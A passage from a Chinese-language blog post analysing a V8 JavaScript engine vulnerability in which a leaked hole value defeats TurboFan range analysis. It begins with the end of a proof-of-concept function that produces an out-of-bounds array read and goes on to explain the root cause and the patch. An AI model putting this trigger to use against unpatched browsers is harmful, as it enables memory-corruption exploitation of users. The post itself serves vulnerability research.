	<span class="token keyword">let</span> idx <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>f <span class="token operator">?</span> hole <span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	idx <span class="token operator">|=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	idx <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token keyword">let</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">1.3</span><span class="token punctuation">,</span> <span class="token number">1.4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">let</span> arr2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x1111</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">let</span> obj <span class="token operator">=</span> arr1<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>idx<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
	<span class="token function">fun</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x4000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
	<span class="token function">fun</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
</code></pre>
<p>通过分析turbolizer图可以大致看到它会将idx的数据范围设定在-1~-1之间，据此在进行后续的计算最终得到的数组下标为0：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-11-01/rmmehIMerNtw2U0A.png" alt="输入图片说明"><br>
在SimplifiedLowering阶段后，CheckSmi检查节点将会被优化掉，转而生成两个类型转换节点先从Int31转换为TaggedSigned类型，再从TaggedSigned转换为Int64类型：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-11-01/oiTQgVKJ8BfSB23K.png" alt="输入图片说明"><br>
但是当代码执行时idx实际为1并非为0，导致在实际运行时出现越界：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-11-01/0tql1Q7cb5sZ8oF6.png" alt="输入图片说明"><br>
注意此利用方式在v8 11.6版本上已经被修补。</p>
<h2 id="问题总结"><span class="prefix"></span><span class="content">问题总结</span><span class="suffix"></span></h2>
<ul>
<li>对v8的一些机制处理细节理解不够全面、深入</li>
<li>因为前一个问题导致即使梳理清了漏洞触发的流程也无法写出可以触发漏洞的poc用例，当遇到某些分支时总是无法控制执行流进入需要进入的分支。</li>
</ul>
<p>根据分析此漏洞可以推断此漏洞的发现者很可能是通过代码审计的方式发现的此漏洞，当然也有可能是针对性fuzz，在挖掘此漏洞时着重关注了存在依赖关系的前后代码逻辑不匹配以及存在未考虑到的输入内容的情况。例如在此漏洞中导致漏洞发生的限制节点，其生成涉及到<code>elements_length</code>与<code>length</code>，并且还有<code>receiver_is_jsarray</code>：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-26/cuCIh6nFkuLTXrbt.png" alt="输入图片说明"><br>
其中<code>elements_length</code>节点的生成逻辑比较简单直接从elements的固定偏移处获取即可，所以在使用<code>elements_length</code>生成限制节点的逻辑没有问题：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-26/ytFYCgfx2vFsi18q.png" alt="输入图片说明"><br>
但是length节点的生成就比较复杂了，他考虑到了receiver是否是JSArray的问题，但是在生成限制节点时却假设无论<code>elements_kind</code>是否为<code>HOLEY_ELEMENTS</code>receiver都绝对为JSArray，但实际情况却不是，它还有可能是Arguments，所以在patch后在限制节点的生成位置还增加了receiver非JSArray的逻辑代码，当receiver非JSArray时将直接使用<code>elements_length</code>而不再让其进行扩展：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-26/UZ5ybHh1RNnbNTJ3.png" alt="输入图片说明"><br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-26/bsdB3A0iKvfGnP9H.png" alt="输入图片说明"><br>
至于为什么<code>PACKED_ELEMENTS</code>可以读出hole而<code>HOLEY_ELEMENTS</code>读不出，那是因为只有<code>HOLEY_ELEMENTS</code>才会去检查读取值是否为hole当是hole时就返回undefined，而<code>PACKED_ELEMENTS</code>则不会检查：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-26/NA0aTv5a2bsWidEm.png" alt="输入图片说明"><br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-26/5qbLXmX0NYk8ZVIo.png" alt="输入图片说明"><br>
然后还有JSArray<code>PACKED_ELEMENTS</code>这种情况，这种情况也不会造成hole对象泄露，当在处理边界检查时会区分处理JSArray与非JSArray：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-27/OfWZKuDsH3NXpaCN.png" alt="输入图片说明"><br>
在<code>BuildElementAccess</code>函数中，对于arguments对象而言在<code>BuildElementAccess</code>函数中则会从elements中获取实际容量来作为边界(如上图)：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-27/m5VzFDaH95ET82lz.png" alt="输入图片说明"><br>
而在<code>AccessorAssembler::EmitFastElementsBoundsCheck</code>函数中进行边界检查时对于arguments对象会通过elements来获取实际容量来作为边界，而在此处arguments的实际容量为17要大于其length，并且除了元素1以外剩下的都是hole对象，再加上由于elements kind为<code>PACKED_ELEMENTS</code>可以绕过hole检查读出hole对象：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-27/BZG7a6p62res4EqA.png" alt="输入图片说明"><br>
而对于array则会直接从receiver中获取length来作为边界，所以即使length与elements实际容量不一致也无法越界读取到hole对象：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-27/kohMr1hLeix3zhTm.png" alt="输入图片说明"><br>
一句话总结原因那就是arguments对象使用elements中的实际容量作为边界，而array则使用receiver中的length作为边界，对于使用hole作为填充的<code>PACKED_ELEMENTS</code>而言，length长度只是elements中实际有效数据的长度是排除hole的，而实际容量则包括hole和实际有效数据是不排除hole的。</p>
</div>
</body>

</html>
